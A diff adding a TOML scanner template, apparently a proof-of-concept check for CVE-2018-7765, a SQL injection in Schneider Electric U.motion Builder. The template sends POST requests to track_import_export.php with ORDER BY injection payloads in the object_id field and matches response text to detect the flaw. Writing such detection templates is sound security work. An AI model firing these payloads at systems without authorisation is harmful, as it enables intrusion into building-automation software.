@@ -1,0 +1,78 @@
+[info]
+author = "AVE"
+description = "通过向 track_import_export.php 发送带有 SQL 注入 payload 的 POST 请求，利用 object_id 参数注入 ORDER BY 子句，根据响应内容差异判断是否存在 SQL 注入漏洞。该漏洞影响施耐德电气 U.motion Builder 1.3.4 之前版本。"
+id = "POC-AVE-2018-0205"
+name = "Schneider Electric U.motion Builder SQL注入漏洞 PoC"
+severity = "high"
+tags = ["ave-2018-0205"]
+vuln_id = [
+    "CVE-2018-7765",
+    "AVE-2018-0205",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/umotion/modules/reporting/track_import_export.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "op=export&language=english&interval=1&object_id=1' order by 1-- -"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Object"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Period"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/umotion/modules/reporting/track_import_export.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "op=export&language=english&interval=1&object_id=1' order by 2-- -"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Object"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Period"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Invalid argument supplied for foreach"]
